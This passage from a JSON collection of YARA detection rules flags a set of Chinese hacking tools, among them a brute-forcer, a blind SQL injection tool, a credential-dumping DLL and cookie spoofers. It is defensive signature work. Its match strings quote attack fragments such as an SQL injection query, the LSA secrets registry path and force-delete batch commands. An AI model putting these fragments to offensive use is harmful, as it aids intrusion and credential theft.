\"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 02:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n      $s2 = \"\\\\Device\\\\XScanPF\" fullword wide\n      $s3 = \"\\\\DosDevices\\\\XScanPF\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them\n}","date":"2015-06-13 02:36:41","description":"Chinese Hacktool Set - file xpf.sys","minimum_yara":"1.7","name":"dat_xpf_RID29F7","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"4a0f6e59e6dc01c7df5ac5696708ddb8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Arp_EMP_v1_0_RID2B0A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Arp EMP v1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:49:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Arp EMP v1.0.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2015-06-13 08:49:31","description":"Chinese Hacktool Set - file Arp EMP v1.0.exe","minimum_yara":"1.7","name":"Arp_EMP_v1_0_RID2B0A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"7b7c9bff655595ce612c9ba2993eda01","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule HTTPSCANNER_RID2A5B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file HTTPSCANNER_RID2A5B.EXE\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:23:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HttpScanner.exe\" fullword wide\n      $s2 = \"HttpScanner\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3500KB and all of them\n}","date":"2015-06-13 05:23:21","description":"Chinese Hacktool Set - file HTTPSCANNER.EXE","minimum_yara":"1.7","name":"HTTPSCANNER_RID2A5B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3026b737f4e09a512a07653b69c3eace","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_pc_RID2B44 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pc.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\svchost.exe\" fullword ascii\n      $s2 = \"%s%08x.001\" fullword ascii\n      $s3 = \"Qy001Service\" fullword ascii\n      $s4 = \"/.MIKY\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-13 08:59:11","description":"Chinese Hacktool Set - file pc.exe","minimum_yara":"1.7","name":"CN_Tools_pc_RID2B44","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"6983d62951572beadc80e6510f3926f1","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PLUGIN_AJunk_RID2B18 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file AJunk.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AJunk.dll\" fullword ascii\n      $s2 = \"AJunk.DLL\" fullword wide\n      $s3 = \"AJunk Dynamic Link Library\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 560KB and all of them\n}","date":"2015-06-13 08:51:51","description":"Chinese Hacktool Set - file AJunk.dll","minimum_yara":"1.7","name":"PLUGIN_AJunk_RID2B18","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"cbb7d3c13f165f5deb097645aee32601","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Tools_scan_RID2B26 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file scan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:54:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Shanlu Studio\" fullword wide\n      $s3 = \"_AutoAttackMain\" fullword ascii\n      $s4 = \"_frmIpToAddr\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-13 08:54:11","description":"Chinese Hacktool Set - file scan.exe","minimum_yara":"1.7","name":"Tools_scan_RID2B26","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"eb42635c5d6161746b1fa2899e78738b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule IISPutScannesr_RID2C6C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IISPutScannesr_RID2C6C.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"yoda & M.o.D.\" ascii\n      $s2 = \"-> come.to/f2f **************\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}","date":"2015-06-13 09:48:31","description":"Chinese Hacktool Set - file IISPutScannesr.exe","minimum_yara":"1.7","name":"IISPutScannesr_RID2C6C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e4a5940830f463bee658bdba9f39d559","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_xbat_RID2C20 : APT CHINA DEMO FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xbat.vbs\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:35:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ws.run \\\"srss.bat /start\\\",0 \" fullword ascii\n      $s1 = \"Set ws = Wscript.CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x6553 and filesize < 0KB and all of them\n}","date":"2015-06-13 09:35:51","description":"Chinese Hacktool Set - file xbat.vbs","minimum_yara":"1.7","name":"CN_Tools_xbat_RID2C20","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"79fcc34418a66945907ddabfa59a8c2a","score":60,"tags":["APT","DEMO","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_srss_RID2C3C : APT CHINA DEMO HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file srss.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"srss.exe -idx 0 -ip\" \n      $s1 = \"-port 21 -logfilter \\\"_USER ,_P\" ascii\n   condition: \n      filesize < 100 and all of them\n}","date":"2015-06-13 09:40:31","description":"Chinese Hacktool Set - file srss.bat","minimum_yara":"1.7","name":"CN_Tools_srss_RID2C3C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9fbb518dcd86fc0e06393116565b264a","score":60,"tags":["APT","DEMO","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule dll_UnReg_RID2A8D : APT CHINA DEMO HKTL T1117 {\n   meta:\n      description = \"Chinese Hacktool Set - file UnReg.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, HKTL, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"regsvr32.exe /u C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n      $s1 = \"del /F /Q C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2015-06-13 06:46:41","description":"Chinese Hacktool Set - file UnReg.bat","minimum_yara":"1.7","name":"dll_UnReg_RID2A8D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"a106773454143a1048cb0680104f5b5c","score":60,"tags":["APT","DEMO","CHINA","T1117","HKTL"]},{"author":"Florian Roth","content":"rule dll_Reg_RID29CA : APT CHINA DEMO HKTL T1117 {\n   meta:\n      description = \"Chinese Hacktool Set - file Reg.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:21:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, HKTL, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy PacketX.dll C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n      $s1 = \"regsvr32.exe C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-13 01:21:41","description":"Chinese Hacktool Set - file Reg.bat","minimum_yara":"1.7","name":"dll_Reg_RID29CA","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2a877bf7526e2afe4d21fb479151141f","score":60,"tags":["APT","DEMO","CHINA","T1117","HKTL"]},{"author":"Florian Roth","content":"rule sbin_squid_RID2B42 : APT CHINA DEMO HKTL T1007 {\n   meta:\n      description = \"Chinese Hacktool Set - file squid.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:58:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, HKTL, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /s /f /q\" fullword ascii\n      $s1 = \"squid.exe -z\" fullword ascii\n      $s2 = \"net start Squid\" fullword ascii\n      $s3 = \"net stop Squid\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-13 08:58:51","description":"Chinese Hacktool Set - file squid.bat","minimum_yara":"1.7","name":"sbin_squid_RID2B42","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"ee36e47017ff4e95fed04600df3a046d","score":60,"tags":["APT","DEMO","T1007","CHINA","HKTL"]},{"author":"Florian Roth","content":"rule mswin_check_lm_group_RID2F60 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mswin_check_lm_group_RID2F60.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n      $s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n      $s3 = \"-D    default user Domain\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of them\n}","date":"2015-06-13 11:54:31","description":"Chinese Hacktool Set - file mswin_check_lm_group.exe","minimum_yara":"1.7","name":"mswin_check_lm_group_RID2F60","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"94b26263646b42303edd528cc0290898","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WAF_Bypass_RID2AC0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WAF-Bypass.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:11:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n      $s2 = \"User-Agent:\" fullword wide\n      $s3 = \"Send Failed.in RemoteThread\" fullword ascii\n      $s4 = \"www.example.com\" fullword wide\n      $s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n      $s6 = \"Connect To Server Failed.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7992KB and 5 of them\n}","date":"2015-06-13 08:11:41","description":"Chinese Hacktool Set - file WAF-Bypass.exe","minimum_yara":"1.7","name":"WAF_Bypass_RID2AC0","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"fb69bb3f21d24c1e36273a950466bb73","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Guilin_veterans_cookie_spoofing_tool_RID35FA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 16:36:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kernel32.dll^G\" fullword ascii\n      $s1 = \"\\\\.Sus\\\"B\" fullword ascii\n      $s4 = \"u56Load3\" fullword ascii\n      $s11 = \"O MYTMP(iM) VALUES (\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1387KB and all of them\n}","date":"2015-06-13 16:36:11","description":"Chinese Hacktool Set - file Guilin veterans cookie spoofing tool.exe","minimum_yara":"1.7","name":"Guilin_veterans_cookie_spoofing_tool_RID35FA","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9dade89e7bd064e5ceb1ddc96c279159","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MarathonTool_RID2BE9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MarathonTool_RID2BE9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MarathonTool_RID2BE9\" ascii\n      $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n      $s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1040KB and all of them\n}","date":"2015-06-13 09:26:41","description":"Chinese Hacktool Set - file MarathonTool.exe","minimum_yara":"1.7","name":"MarathonTool_RID2BE9","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3e74d8fbab426bbbc6aa0f101865f7bd","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PLUGIN_TracKid_RID2BE1 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file TracKid.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n      $s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n      $s2 = \"Coded by prince\" fullword ascii\n      $s3 = \"TracKid.dll\" fullword ascii\n      $s4 = \".\\\\TracKid Log\" fullword ascii\n      $s5 = \"%08x -- %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}","date":"2015-06-13 09:25:21","description":"Chinese Hacktool Set - file TracKid.dll","minimum_yara":"1.7","name":"PLUGIN_TracKid_RID2BE1","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"07c843cd7cb3d204ec77bf685ccca9c5","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule sekurlsa_RID2A7B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file sekurlsa_RID2A7B.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:16:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bienvenue dans un processus distant\" fullword wide\n      $s2 = \"Format d'appel invalide : addLogonSession [idSecAppHigh] idSecAppLow Utilisateur\" wide\n      $s3 = \"SECURITY\\\\Policy\\\\Secrets\" fullword wide\n      $s4 = \"Injection de donn\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1150KB and all of them\n}","date":"2015-06-13 06:16:41","description":"Chinese Hacktool Set - file sekurlsa.dll","minimum_yara":"1.7","name":"sekurlsa_RID2A7B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1bc9e68ca2af99669bd4f5093a2f1355","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule mysqlfast_RID2AF5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mysqlfast_RID2AF5.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Invalid password hash: %s\" fullword ascii\n      $s3 = \"-= MySql Hash Cracker =- \" fullword ascii\n      $s4 = \"Usage: %s hash\" fullword ascii\n      $s5 = \"Hash: %08lx%08lx\" fullword ascii\n      $s6 = \"Found pass: \" fullword ascii\n      $s7 = \"Pass not found\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them\n}","date":"2015-06-13 09:40:01","description":"Chinese Hacktool Set - file mysqlfast.exe","minimum_yara":"1.7","name":"mysqlfast_RID2AF5","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d451ea12d7a1aab5bde2d776a05a5eb6","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule DTools2_02_DTools_RID2D0D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file DTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kernel32.dll\" ascii\n      $s1 = \"TSETPASSWORDFORM\" fullword wide\n      $s2 = \"TGETNTUSERNAMEFORM\" fullword wide\n      $s3 = \"TPORTFORM\" fullword wide\n      $s4 = \"ShellFold\" fullword ascii\n      $s5 = \"DefaultPHotLigh\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2015-06-13 10:15:21","description":"Chinese Hacktool Set - file DTools.exe","minimum_yara":"1.7","name":"DTools2_02_DTools_RID2D0D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"0c586d0a4945d0b6c50e7edb911b33b8","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule dll_PacketX_RID2B5C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:03:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"[Failed to load winpcap packet.dll.\" wide\n      $s10 = \"PacketX Version\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1920KB and all of them\n}","date":"2015-06-13 09:03:11","description":"Chinese Hacktool Set - file PacketX.dll - ActiveX wrapper for WinPcap packet capture library","minimum_yara":"1.7","name":"dll_PacketX_RID2B5C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"56285a1918eb7fae593fa6272cc59de3","score":50,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule SqlDbx_zhs_RID2B13 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SqlDbx_zhs_RID2B13.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"S.failed_logins \\\"Failed Login Attempts\\\", \" fullword ascii\n      $s7 = \"SELECT ROLE, PASSWORD_REQUIRED FROM SYS.DBA_ROLES ORDER BY ROLE\" fullword ascii\n      $s8 = \"SELECT spid 'SPID', status 'Status', db_name (dbid) 'Database', loginame 'Login'\" ascii\n      $s9 = \"bcp.exe <:schema:>.<:table:> out \\\"<:file:>\\\" -n -S <:server:> -U <:user:> -P <:\" ascii\n      $s11 = \"L.login_policy_name AS \\\"Login Policy\\\", \" fullword ascii\n      $s12 = \"mailto:support@sqldbx.com\" fullword ascii\n      $s15 = \"S.last_login_time \\\"Last Login\\\", \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 4 of them\n}","date":"2015-06-13 08:51:01","description":"Chinese Hacktool Set - file SqlDbx_zhs.exe","minimum_yara":"1.7","name":"SqlDbx_zhs_RID2B13","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1dbf66fc1e7be98eae5780e2c9ee0c02","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule DUBrute_DUBrute_RID2CA6 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file DUBrute.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:58:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n      $s2 = \"IP - 0; Login - 0; Password - 0; Combination - 0\" fullword ascii\n      $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n      $s4 = \"UBrute.com\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1020KB and all of them\n}","date":"2015-06-13 09:58:11","description":"Chinese Hacktool Set - file DUBrute.exe","minimum_yara":"1.7","name":"DUBrute_DUBrute_RID2CA6","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"e7d7d00f997f01103453538072d10647","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule ChineseHack_Tool_RID2D44 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CookieTools.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:24:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://210.73.64.88/doorway/cgi-bin/getclientip.asp?IP=\" fullword ascii\n      $s2 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s3 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n      $s4 = \"OnGetPasswordP\" fullword ascii\n      $s5 = \"http://www.chinesehack.org/\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 4 of them\n}","date":"2015-06-13 10:24:31","description":"Chinese Hacktool Set - file CookieTools.exe","minimum_yara":"1.7","name":"ChineseHack_Tool_RID2D44","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d3eec543cf2344d13b0bd2d1fb274e64","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule update_PcInit_RID2C3A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file PcInit.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\svchost.exe\" fullword ascii\n      $s2 = \"%s%08x.001\" fullword ascii\n      $s3 = \"Global\\\\ps%08x\" fullword ascii\n      $s4 = \"drivers\\\\\" fullword ascii\n      $s5 = \"StrStrA\" fullword ascii\n      $s6 = \"StrToIntA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}","date":"2015-06-13 09:40:11","description":"Chinese Hacktool Set - file PcInit.exe","minimum_yara":"1.7","name":"update_PcInit_RID2C3A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"609bac9924ed77c25c2f6cbba2d9b423","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule dat_NaslLib_RID2B4E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NaslLib.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:00:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n      $s2 = \"[*] \\\"%s\\\" completed, 